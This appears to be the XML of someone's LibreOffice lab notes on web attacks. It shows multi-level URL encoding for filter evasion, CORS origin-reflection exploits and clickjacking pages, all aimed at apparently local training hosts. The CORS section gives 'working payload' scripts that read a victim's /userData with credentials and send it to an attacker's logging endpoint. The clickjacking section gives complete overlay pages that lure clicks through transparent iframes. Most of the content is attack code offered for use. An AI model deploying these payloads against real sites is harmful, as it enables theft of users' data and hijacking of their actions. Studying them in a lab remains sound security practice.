        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P92"><text:span text:style-name="Source_20_Text">%63</text:span> → <text:span text:style-name="Source_20_Text">%2563</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P92"><text:span text:style-name="Source_20_Text">%72</text:span> → <text:span text:style-name="Source_20_Text">%2572</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P92"><text:span text:style-name="Source_20_Text">%69</text:span> → <text:span text:style-name="Source_20_Text">%2569</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P92"><text:span text:style-name="Source_20_Text">%70</text:span> → <text:span text:style-name="Source_20_Text">%2570</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P91"><text:span text:style-name="Source_20_Text">%74</text:span> → <text:span text:style-name="Source_20_Text">%2574</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="P6" text:outline-level="4"><text:soft-page-break/>. Third-Level URL Encoding:</text:h>
      <text:list xml:id="list4175769372" text:style-name="L5">
        <text:list-item>
          <text:p text:style-name="P94"><text:span text:style-name="Source_20_Text">%2573</text:span> → <text:span text:style-name="Source_20_Text">%252575</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P94"><text:span text:style-name="Source_20_Text">%2563</text:span> → <text:span text:style-name="Source_20_Text">%252563</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P94"><text:span text:style-name="Source_20_Text">%2572</text:span> → <text:span text:style-name="Source_20_Text">%252572</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P94"><text:span text:style-name="Source_20_Text">%2569</text:span> → <text:span text:style-name="Source_20_Text">%252569</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P94"><text:span text:style-name="Source_20_Text">%2570</text:span> → <text:span text:style-name="Source_20_Text">%252570</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P93"><text:span text:style-name="Source_20_Text">%2574</text:span> → <text:span text:style-name="Source_20_Text">%252574</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P4">%252575%252563%252572%252569%252570%252574<text:line-break/><text:line-break/><text:line-break/><text:span text:style-name="T31">CORS</text:span></text:p>
      <text:p text:style-name="P38">1. Basic Origin reflection</text:p>
      <text:p text:style-name="P44">1. try by putting key value pair as origin:example.com in the inpect network tab request of the relevant request.</text:p>
      <text:p text:style-name="P71">2. the CORS headers should reflect in the response headers. If it reflecting for it, that means the response can be accessed from any website.<text:line-break/>3. try the below payload.</text:p>
      <text:p text:style-name="P44"><text:line-break/>&lt;script&gt;</text:p>
      <text:p text:style-name="P43">var xhr = new XMLHttpRequest();</text:p>
      <text:p text:style-name="P43">xhr.onload = function() {</text:p>
      <text:p text:style-name="P43">if (xhr.responseText.trim() !== '') {</text:p>
      <text:p text:style-name="P43"><text:s text:c="4"/>window.location.href = 'http://localhost:30001/log?key='+this.responseText; </text:p>
      <text:p text:style-name="P43">}</text:p>
      <text:p text:style-name="P43">};</text:p>
      <text:p text:style-name="P43">xhr.open('GET', 'http://localhost:30000/userData/', true);</text:p>
      <text:p text:style-name="P43">xhr.withCredentials = true;</text:p>
      <text:p text:style-name="P43">xhr.send();</text:p>
      <text:p text:style-name="P43">&lt;/script&gt;</text:p>
      <text:p text:style-name="P43"/>
      <text:p text:style-name="P43"/>
      <text:p text:style-name="P43"/>
      <text:p text:style-name="P43"/>
      <text:p text:style-name="P39">2. <text:span text:style-name="T33">Trusted subdomain cors. Only one subdomain will be visible in the header.</text:span></text:p>
      <text:p text:style-name="P47"/>
      <text:p text:style-name="P47"><text:span text:style-name="T32">try the page which has search field </text:span><text:span text:style-name="T33">and try the below payload<text:line-break/></text:span></text:p>
      <text:p text:style-name="P48">working payload:</text:p>
      <text:p text:style-name="P46">&lt;script&gt;document.location="<text:a xlink:type="simple" xlink:href="http://app.bodhitree.com:30000/participants/?courseid=5&amp;search=%3Cscript%3E+%09var+xhr+%3D+new+XMLHttpRequest%28%29%3B++%09xhr.onload+%3D+function%28%29+%7B+%09%09location%3D%27http%3A%2F%2Flocalhost%3A30001%2Flog%3Fkey%3D%27%2Bthis.responseText%3B++%09%7D%3B++%09xhr.open%28%27GET%27%2C+%27http%3A%2F%2Fapp.bodhitree.com%3A30000%2FuserData%27%2C+true%29%3B+%09xhr.withCredentials+%3D+true%3B+%09xhr.setRequestHeader%28%27origin%27%2C+%27http%3A%2F%2Fapp.bodhitree.com%3A30000%27%29%3B+%09xhr.send%28%29%3B+%3C%2Fscript%3E" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://app.bodhitree.com:30000/participants/?courseid=5&amp;search=%3Cscript%3E+%09var+xhr+%3D+new+XMLHttpRequest%28%29%3B++%09xhr.onload+%3D+function%28%29+%7B+%09%09location%3D%27http%3A%2F%2Flocalhost%3A30001%2Flog%3Fkey%3D%27%2Bthis.responseText%3B++%09%7D%3B++%09xhr.open%28%27GET%27%2C+%27http%3A%2F%2Fapp.bodhitree.com%3A30000%2FuserData</text:a><text:soft-page-break/><text:a xlink:type="simple" xlink:href="http://app.bodhitree.com:30000/participants/?courseid=5&amp;search=%3Cscript%3E+%09var+xhr+%3D+new+XMLHttpRequest%28%29%3B++%09xhr.onload+%3D+function%28%29+%7B+%09%09location%3D%27http%3A%2F%2Flocalhost%3A30001%2Flog%3Fkey%3D%27%2Bthis.responseText%3B++%09%7D%3B++%09xhr.open%28%27GET%27%2C+%27http%3A%2F%2Fapp.bodhitree.com%3A30000%2FuserData%27%2C+true%29%3B+%09xhr.withCredentials+%3D+true%3B+%09xhr.setRequestHeader%28%27origin%27%2C+%27http%3A%2F%2Fapp.bodhitree.com%3A30000%27%29%3B+%09xhr.send%28%29%3B+%3C%2Fscript%3E" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">%27%2C+true%29%3B+%09xhr.withCredentials+%3D+true%3B+%09xhr.setRequestHeader%28%27origin%27%2C+%27http%3A%2F%2Fapp.bodhitree.com%3A30000%27%29%3B+%09xhr.send%28%29%3B+%3C%2Fscript%3E</text:a>"&lt;/script&gt;</text:p>
      <text:p text:style-name="P46"/>
      <text:p text:style-name="P46"/>
      <text:p text:style-name="P49">Working payload:</text:p>
      <text:p text:style-name="P45">&lt;script&gt;</text:p>
      <text:p text:style-name="P45">document.location="http://app.bodhitree.com:30000/participants/?courseid=5&amp;search=</text:p>
      <text:p text:style-name="P45">&lt;script&gt;</text:p>
      <text:p text:style-name="P45"><text:tab/>var xhr = new XMLHttpRequest();</text:p>
      <text:p text:style-name="P45"><text:tab/>xhr.onload = function() {</text:p>
      <text:p text:style-name="P45"><text:tab/>location = 'http://localhost:30001/log?key=' + this.responseText;</text:p>
      <text:p text:style-name="P45"><text:tab/>}; <text:s/></text:p>
      <text:p text:style-name="P45"><text:tab/>xhr.open('GET', 'http://app.bodhitree.com:30000/userData', true);</text:p>
      <text:p text:style-name="P45"><text:tab/>xhr.withCredentials = true;</text:p>
      <text:p text:style-name="P45"><text:tab/>xhr.setRequestHeader('origin', 'http://app.bodhitree.com:30000');</text:p>
      <text:p text:style-name="P45"><text:tab/>xhr.send();</text:p>
      <text:p text:style-name="P45">&lt;/script&gt;"</text:p>
      <text:p text:style-name="P45">&lt;/script&gt;</text:p>
      <text:p text:style-name="P43"/>
      <text:p text:style-name="P43"/>
      <text:p text:style-name="P60">Clicljacking</text:p>
      <text:p text:style-name="P61">1. <text:span text:style-name="T22">Simple Clickjacking</text:span></text:p>
      <text:p text:style-name="P70"/>
      <text:p text:style-name="P70"/>
      <text:p text:style-name="P70"/>
      <text:p text:style-name="P70"/>
      <text:p text:style-name="P70"/>
      <text:p text:style-name="P70"/>
      <text:p text:style-name="P70">&lt;head&gt;</text:p>
      <text:p text:style-name="P70">&lt;style&gt;</text:p>
      <text:p text:style-name="P70">.center-div {</text:p>
      <text:p text:style-name="P70">position:relative;</text:p>
      <text:p text:style-name="P70">width:128px;</text:p>
      <text:p text:style-name="P70">height:200px;</text:p>
      <text:p text:style-name="P70">opacity:50%;</text:p>
      <text:p text:style-name="P70">z-index:1;</text:p>
      <text:p text:style-name="P70">top:50%;</text:p>
      <text:p text:style-name="P70">left:50%;</text:p>
      <text:p text:style-name="P70">}</text:p>
      <text:p text:style-name="P70">iframe {</text:p>
      <text:p text:style-name="P70">position:absolute;</text:p>
      <text:p text:style-name="P70"><text:soft-page-break/>width:100%;</text:p>
      <text:p text:style-name="P70">height:100%;</text:p>
      <text:p text:style-name="P70">z-index:2;</text:p>
      <text:p text:style-name="P70">opacity:50%</text:p>
      <text:p text:style-name="P70">}</text:p>
      <text:p text:style-name="P70">&lt;/style&gt;</text:p>
      <text:p text:style-name="P70">&lt;/head&gt;</text:p>
      <text:p text:style-name="P70">&lt;body&gt;</text:p>
      <text:p text:style-name="P70">&lt;iframe src="http://localhost:30000/userDetails.php"&gt;&lt;/iframe&gt;</text:p>
      <text:p text:style-name="P70">&lt;div id="clickjacking" class="center-div"&gt;Click me&lt;/div&gt;</text:p>
      <text:p text:style-name="P62"><text:span text:style-name="T22">&lt;/body&gt;<text:line-break/><text:line-break/><text:line-break/></text:span><text:span text:style-name="T27">2. Multistep clickjacking</text:span></text:p>
      <text:p text:style-name="P83">&lt;style&gt;</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T34">#clickjacking1</text:span> {</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">position</text:span>:<text:span text:style-name="T36">relative</text:span>;</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">top</text:span>:<text:span text:style-name="T37">50%</text:span>;</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">left</text:span>:<text:span text:style-name="T37">50%</text:span>;</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">z-index</text:span>:<text:span text:style-name="T37">1</text:span>;</text:p>
      <text:p text:style-name="P80">}</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T34">#clickjacking2</text:span> {</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">top</text:span>:<text:span text:style-name="T37">50%</text:span>;</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">left</text:span>:<text:span text:style-name="T37">50%</text:span>;</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">position</text:span>:<text:span text:style-name="T36">relative</text:span>;</text:p>
      <text:p text:style-name="P80">}</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T34">iframe</text:span> {</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">position</text:span>:<text:span text:style-name="T36">absolute</text:span>;</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">z-index</text:span>:<text:span text:style-name="T37">2</text:span>;</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">opacity</text:span>:<text:span text:style-name="T37">0.01</text:span>;</text:p>
      <text:p text:style-name="P80">}</text:p>
      <text:p text:style-name="P82">&lt;/style&gt;</text:p>
      <text:p text:style-name="P84"/>
      <text:p text:style-name="P80"><text:span text:style-name="T34">&lt;iframe</text:span> <text:span text:style-name="T35">id</text:span>=<text:span text:style-name="T38">"bottom-victim"</text:span></text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">src</text:span>=<text:span text:style-name="T38">"http://localhost:30000/userDetails.php"</text:span><text:span text:style-name="T34">&gt;</text:span></text:p>
      <text:p text:style-name="P82">&lt;/iframe&gt;</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T34">&lt;div</text:span> <text:span text:style-name="T35">id</text:span>=<text:span text:style-name="T38">"clickjacking1"</text:span><text:span text:style-name="T34">&gt;</text:span>Click me first<text:span text:style-name="T34">&lt;/div&gt;</text:span></text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T34">&lt;div</text:span> <text:span text:style-name="T35">id</text:span>=<text:span text:style-name="T38">"clickjacking2"</text:span><text:span text:style-name="T34">&gt;</text:span>Click me next<text:span text:style-name="T34">&lt;/div&gt;</text:span></text:p>
      <text:p text:style-name="P81"><text:line-break/></text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T34">&lt;!DOCTYPE</text:span> <text:span text:style-name="T35">html</text:span><text:span text:style-name="T34">&gt;</text:span></text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T34">&lt;html</text:span> <text:span text:style-name="T35">lang</text:span>=<text:span text:style-name="T38">"en"</text:span><text:span text:style-name="T34">&gt;</text:span></text:p>
      <text:p text:style-name="P82">&lt;head&gt;</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T34">&lt;meta</text:span> <text:span text:style-name="T35">charset</text:span>=<text:span text:style-name="T38">"UTF-8"</text:span><text:span text:style-name="T34">&gt;</text:span></text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T34">&lt;meta</text:span> <text:span text:style-name="T35">name</text:span>=<text:span text:style-name="T38">"viewport"</text:span> <text:span text:style-name="T35">content</text:span>=<text:span text:style-name="T38">"width=device-width, initial-scale=1.0"</text:span><text:span text:style-name="T34">&gt;</text:span></text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T34">&lt;title&gt;</text:span>Div and Iframe Overlay<text:span text:style-name="T34">&lt;/title&gt;</text:span></text:p>
      <text:p text:style-name="P82">&lt;style&gt;</text:p>
      <text:p text:style-name="P84"/>
      <text:p text:style-name="P80"><text:soft-page-break/><text:span text:style-name="T34">iframe</text:span> {</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">position</text:span>: <text:span text:style-name="T36">fixed</text:span>;</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">top</text:span>: <text:span text:style-name="T37">0</text:span>;</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">left</text:span>: <text:span text:style-name="T37">0</text:span>;</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">width</text:span>: <text:span text:style-name="T37">100%</text:span>;</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">height</text:span>: <text:span text:style-name="T37">100%</text:span>;</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">z-index</text:span>: <text:span text:style-name="T37">2</text:span>;</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">border</text:span>: <text:span text:style-name="T36">none</text:span>;</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">opacity</text:span>: <text:span text:style-name="T37">50%</text:span></text:p>
      <text:p text:style-name="P80">}</text:p>
      <text:p text:style-name="P84"/>
      <text:p text:style-name="P80"><text:span text:style-name="T34">.center-div1</text:span> {</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">position</text:span>: <text:span text:style-name="T36">absolute</text:span>;</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">top</text:span>: <text:span text:style-name="T37">63%</text:span>;</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">left</text:span>: <text:span text:style-name="T37">50%</text:span>;</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">transform</text:span>: translate(<text:span text:style-name="T37">-50%</text:span>, <text:span text:style-name="T37">-50%</text:span>);</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">z-index</text:span>: <text:span text:style-name="T37">1</text:span>;</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">text-align</text:span>: <text:span text:style-name="T36">center</text:span>;</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">padding</text:span>: <text:span text:style-name="T37">20px</text:span>;</text:p>
      <text:p text:style-name="P80">}</text:p>
      <text:p text:style-name="P84"/>
      <text:p text:style-name="P80"><text:span text:style-name="T34">.center-div2</text:span> {</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">position</text:span>: <text:span text:style-name="T36">absolute</text:span>;</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">top</text:span>: <text:span text:style-name="T37">55%</text:span>;</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">left</text:span>: <text:span text:style-name="T37">50%</text:span>;</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">transform</text:span>: translate(<text:span text:style-name="T37">-50%</text:span>, <text:span text:style-name="T37">-50%</text:span>);</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">z-index</text:span>: <text:span text:style-name="T37">1</text:span>;</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">text-align</text:span>: <text:span text:style-name="T36">center</text:span>;</text:p>
      <text:p text:style-name="P80"><text:span text:style-name="T35">padding</text:span>: <text:span text:style-name="T37">20px</text:span>;</text:p>
      <text:p text:style-name="P80">}</text:p>
      <text:p text:style-name="P82">&lt;/style&gt;</text:p>
      <text:p text:style-name="P82">&lt;/head&gt;</text:p>
      <text:p text:style-name="P82">&lt;body&gt;</text:p>
      <text:p text:style-name="P84"/>
      <text:p text:style-name="P80"><text:span text:style-name="T34">&lt;iframe</text:span> <text:span text:style-name="T35">src</text:span>=<text:span text:style-name="T38">"http://localhost:30000/userDetails.php"</text:span><text:span text:style-name="T34">&gt;&lt;/iframe&gt;</text:span></text:p>
      <text:p text:style-name="P84"/>
      <text:p text:style-name="P80"><text:span text:style-name="T34">&lt;div</text:span> <text:span text:style-name="T35">id</text:span>=<text:span text:style-name="T38">"clickjacking1"</text:span> <text:span text:style-name="T35">class</text:span>=<text:span text:style-name="T38">"center-div1"</text:span><text:span text:style-name="T34">&gt;</text:span></text:p>
      <text:p text:style-name="P80">Step-1</text:p>
      <text:p text:style-name="P82">&lt;/div&gt;</text:p>
      <text:p text:style-name="P84"/>
      <text:p text:style-name="P80"><text:span text:style-name="T34">&lt;div</text:span> <text:span text:style-name="T35">id</text:span>=<text:span text:style-name="T38">"clickjacking2"</text:span> <text:span text:style-name="T35">class</text:span>=<text:span text:style-name="T38">"center-div2"</text:span><text:span text:style-name="T34">&gt;</text:span></text:p>
      <text:p text:style-name="P80">Step-2</text:p>
      <text:p text:style-name="P82">&lt;/div&gt;</text:p>
      <text:p text:style-name="P84"/>
      <text:p text:style-name="P82">&lt;/body&gt;</text:p>
      <text:p text:style-name="P82">&lt;/html&gt;</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6:50:02.807186980</meta:creation-date>
    <dc:date>2024-11-13T16:53:01.707451207</dc:date>
    <meta:editing-duration>PT9H14M49S</meta:editing-duration>
    <meta:editing-cycles>23</meta:editing-cycles>
    <meta:generator>LibreOffice/7.3.7.2$Linux_X86_64 LibreOffice_project/30$Build-2</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="11" meta:paragraph-count="323" meta:word-count="1902" meta:character-count="13213" meta:non-whitespace-character-count="11634"/>
  </office:meta>
</office:document-meta>
</file>